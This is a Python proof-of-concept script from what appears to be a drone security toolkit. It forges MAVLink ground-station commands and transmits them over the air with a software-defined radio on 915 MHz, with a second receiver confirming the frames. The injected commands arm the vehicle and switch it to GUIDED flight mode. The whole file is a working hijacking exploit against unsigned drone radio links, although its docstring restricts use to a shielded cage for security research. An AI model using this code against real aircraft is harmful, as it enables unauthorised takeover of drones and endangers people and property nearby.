#!/usr/bin/env python3
"""PoC 03 - Command Injection OVER-THE-AIR (PWNUAV C2-01/02, EX-01/02).

Impersonates the GCS (sysid 255) and injects a sequence of MAVLink commands
over-the-air: ARM and mode change. A confirmation receiver (RTL) shows that the
forged frames travel and are valid — an unsigned drone would execute them.
Attacker = Pluto TX ; confirmation = RTL RX. ONLY in a cage. venv: .venv-radio
"""
from __future__ import annotations
import os
os.environ.setdefault("MAVLINK20", "1")  # emit MAVLink 2 (0xFD)
import threading, collections
import numpy as np
from pymavlink import mavutil
from pwnuav.rf.gfsk import FS, modulate, bytes_to_bits
from pwnuav.rf.framing import build_frame
from pwnuav.rf import hw
from pwnuav import demo
M = mavutil.mavlink

def main():
    mav = mavutil.mavlink.MAVLink(None, srcSystem=255, srcComponent=190)  # spoofed GCS
    injections = [
        ("ARM",       M.MAV_CMD_COMPONENT_ARM_DISARM, mav.command_long_encode(1,1,M.MAV_CMD_COMPONENT_ARM_DISARM,0, 1,0,0,0,0,0,0)),
        ("SET_GUIDED",M.MAV_CMD_DO_SET_MODE,          mav.command_long_encode(1,1,M.MAV_CMD_DO_SET_MODE,0, M.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,4,0,0,0,0,0)),
    ]
    print(demo.rule("PWNUAV COMMAND INJECTION — GCS impersonation"))
    print("[C2-01] Impersonating ground control station  sysid=255 compid=190")
    print("[C2-02] Target vehicle sysid=1 ; MAVLink2 signing OFF -> sender not verified\n")
    print("[*] Injection set:")
    for i,(name,cmd,msg) in enumerate(injections,1):
        print(f"   {i}) COMMAND_LONG {demo.enum_name('MAV_CMD',cmd)}  ({name})")
    arm_raw = injections[0][2].pack(mav)
    print("\n[*] Frame #1 (ARM) — raw MAVLink 2 on the air:")
    print(demo.hexdump(arm_raw))

    gap=np.zeros(FS//500,np.complex64)
    iqs=[modulate(bytes_to_bits(build_frame(m.pack(mav)))) for (_,_,m) in injections]
    buf=np.tile(np.concatenate([np.concatenate([x,gap]) for x in iqs]),40).astype(np.complex64)
    frame_len=max(len(x) for x in iqs)

    print("\n[EX] Transmitting injection burst on 915 MHz (Pluto) ...")
    def tx():
        d,st=hw.open_tx("plutosdr"); hw.transmit(d,st,buf,2.5); hw.close(d,st)
    rxd,rxst=hw.open_rx("rtlsdr")
    t=threading.Thread(target=tx,daemon=True); t.start()
    s=hw.capture(rxd,rxst,2.0); hw.close(rxd,rxst); t.join(timeout=3)
    frames=hw.decode_messages(s,frame_len)

    cl=[m for m in frames if m.get_type()=="COMMAND_LONG"]
    arm=[m for m in cl if m.command==M.MAV_CMD_COMPONENT_ARM_DISARM and int(m.param1)==1]
    mode=[m for m in cl if m.command==M.MAV_CMD_DO_SET_MODE]
    print(f"\n[*] Confirmed on the air ({len(s):,} IQ samples, {len(cl)} COMMAND_LONG decoded):")
    print(f"   ARM        -> {len(arm):>3} valid frames  target=1  src=255  param1=1        {'OK' if arm else 'x'}")
    print(f"   SET_GUIDED -> {len(mode):>3} valid frames  base_mode=CUSTOM  custom_mode=4   {'OK' if mode else 'x'}")
    ok = bool(arm)
    print("\n[+] INJECTION LANDED — unauthenticated commands accepted on the link (EX-01/EX-02)." if ok else "[-] injection not confirmed")
    return 0 if ok else 1

if __name__ == "__main__":
    raise SystemExit(main())
